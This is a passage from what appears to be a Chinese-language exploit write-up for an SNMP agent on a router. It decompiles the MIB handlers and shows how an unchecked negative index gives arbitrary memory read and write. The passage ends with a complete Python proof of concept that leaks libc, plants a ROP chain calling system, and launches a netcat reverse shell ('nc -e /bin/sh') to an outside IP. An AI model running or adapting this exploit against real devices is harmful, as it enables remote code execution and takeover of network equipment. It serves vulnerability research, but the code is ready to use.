      int v7; // r3
      const char *v8; // r2
      int v9; // r1
      v4 = *a3;
      if ( *a3 == 2 )
      {
        if ( vla_str  2 )
      {
        if ( v4 > 5 )
        {
          if ( v4 != 160 )
            goto LABEL_5;
          v6 = *a4;
          if ( vla_str > 29 )
          {
            v7 = 7;
            v9 = 4;
            v8 = "Go Back";
          }
          else
          {
            v7 = 4;
            v8 = (const char *)(mib_address + 4 * vla_str);
            v9 = 2;
          }
          snmp_set_var_typed_value(v6, v9, (int)v8, v7);
        }
        return 0;
      }
      if ( v4 )
      {
        if ( v4 != 1 )
        {
    LABEL_5:
          snmp_log(3, "unknown mode (%d) in handle_greatMiscSensorsDevice\n", *a3);
          return 5;
        }
        return 0;
      }
      result = netsnmp_check_vb_type(*a4, 2);
      if ( result )
        goto LABEL_15;
      return result;
    }
handle_greatMiscSensorsIndex:
    int __fastcall handle_greatMiscSensorsIndex(int a1, int a2, signed int *a3, _DWORD *a4)
    {
      signed int v4; // r4
      int result; // r0
      v4 = *a3;
      if ( *a3 == 2 )
      {
        vla_str = **(_DWORD **)(*a4 + 16);
        return 0;
      }
      if ( *a3 > 2 )
      {
        if ( v4 > 5 )
        {
          if ( v4 != 0xA0 )
            goto LABEL_5;
          snmp_set_var_typed_value(*a4, 2, (int)&vla_str, 4);// (netsnmp_variable_list *newvar, u_char type, const void *val_str, size_t val_len)
        }
        return 0;
      }
      if ( v4 )
      {
        if ( v4 != 1 )
        {
    LABEL_5:
          snmp_log(3, "unknown mode (%d) in handle_greatMiscSensorsDevice\n", *a3);
          return 5;
        }
        return 0;
      }
      result = netsnmp_check_vb_type(*a4, 2);
      if ( result )
      {
        netsnmp_set_request_error();
        return 0;
      }
      return result;
    }
可以看到handle_greatMiscSensorsDevice中：  
当使用snmpset写对象时，
    #*a3从0循环->0 1 2 3 0 1 2 3......
      if ( *a3 == 2 )
      {
        if ( vla_str <= 29 )
        {
          *(_DWORD *)(mib_address + 4 * vla_str) = **(_DWORD **)(*a4 + 16);
          return 0;
        }
mid_address是在snmp服务启动mib初始化时在init_greatSensors中：
    result = malloc(0x78u);
    mib_address = (int)result;
    vla_str = 0;
而val_str在handle_greatMiscSensorsIndex中可以进行设置：
    vla_str = **(_DWORD **)(*a4 + 16);
即我们对OID对象1.3.6.1.4.1.2021.13.32.1.0设置的值  
所以当我们依次调用handle_greatMiscSensorsIndex进行设置vla_str，此值只需小于29(在这里设置为负数即可)，而后调用handle_greatMiscSensorsDevice即可实现任意地址写  
任意地址读相同原理，当snmpget读取对象时，会调用：
    #v8 = (const char *)(mib_address + 4 * vla_str);
    #这里同样检测vla_str是否大于29，设置为负数即可
    snmp_set_var_typed_value(v6, v9, (int)v8, v7)
即会将对象的值设置我们构造地址处的值  
而后取出对象value返回给snmpget完成任意地址读
## POC
首先需要leak libc  
想到注册回调函数位置  
利用任意地址读找到注册函数保存地址来leak libc
    hex(0x76F5F9F0-0x76F5F40c)=0x5e4
而后再次利用handle来劫持程序流，即netsnmp_call_handler中：
    v10 = (int (__fastcall *)(int *, int, int *, int))v8[3];
    if ( !v10 )
            break;
    se_find_label_in_slist((int)"agent_mode", *v6);
    result = v10(v8, v9, v6, v7);
    v12 = v8[2];
这时候只需要事先布置好一条ROP链，最后将handle改为我们的rop chain地址即可劫持程序流，最终达到RCE：
    ROPgadget  --binary ./libc.so 
    ......
    0x000596bc : ldr r3, [pc, #0x3c] ; ldr r2, [pc, #0x3c] ; add r3, pc, r3 ; ldr r0, [pc, r2] ; ldr r3, [r3] ; blx r3
    ......
    在这里可以先将r3，r2值分别设置为&system function,&shell
    修改handle并再次对snmp对象操作便可达到RCE
    #也可以选择其他ROP链，构造可以system(shell)即可
最终POC：
    #针对我模拟的路由环境,具体情况可能需要修改偏移
    from pwn import *
    import sys
    import os
    #context.log_level="debug"
    def read(ip,offset):
       cmd1="snmpset -v 1 -c public %s 1.3.6.1.4.1.2021.13.32.1.0 i %s" %(ip,offset/4)
       cmd2="snmpget -v 1 -c public %s 1.3.6.1.4.1.2021.13.32.2.0"   %ip
       os.system(cmd1)
       p2=process(cmd2,shell=True)
       p2.recvuntil("INTEGER: ")
       leak=int(p2.recvuntil("\n").strip())
       p2.close()
       return leak
    def write(ip,offset,note):
       cmd1="snmpset -v 1 -c public %s 1.3.6.1.4.1.2021.13.32.1.0 i %s" %(ip,offset/4)
       cmd2="snmpset -v 1 -c public %s 1.3.6.1.4.1.2021.13.32.2.0 i %s"  %(ip,note)
       os.system(cmd1)
       sleep(0.5)
       os.system(cmd2)
    def get_shell(ip):
       cmd="snmpget -v 1 -c public %s 1.3.6.1.4.1.2021.13.32.1.0"   %ip
       os.system(cmd)
    if __name__=="__main__":
        ip=sys.argv[1]
        #leak addr
        handle_addr=read(ip,-0x5e4)
        mibso_base=handle_addr-0x818
        libcso_base=handle_addr+0x507e8
        log.info("mibso_base="+hex(mibso_base))
        log.info("libcso_base="+hex(libcso_base))
        system_addr=libcso_base+0x43210
        ropchain_addr=libcso_base+0x596bc
        r3_addr=libcso_base+0x80394
        r2_addr=libcso_base+0x80398
        #build rop chain
        base=mibso_base+0xd29f0
        cmd_addr=libcso_base+0x80420
        write(ip,r3_addr-base,system_addr)
        write(ip,r2_addr-base,cmd_addr)
        cmd="nc -e /bin/sh 192.168.160.131 1234\x00" #the shell you want run in router
        #padding
        cmd+="1"
        time=len(cmd)/4
        cmd=cmd.ljust((time+1)*4,"1")
        for i in range(time):
              write(ip,cmd_addr+i*4-base,u32(cmd[i*4:i*4+4]))
        write(ip,-0x5e4,ropchain_addr)
        get_shell(ip)
## Run POC&&Get Shell
    python payload.py  router_ip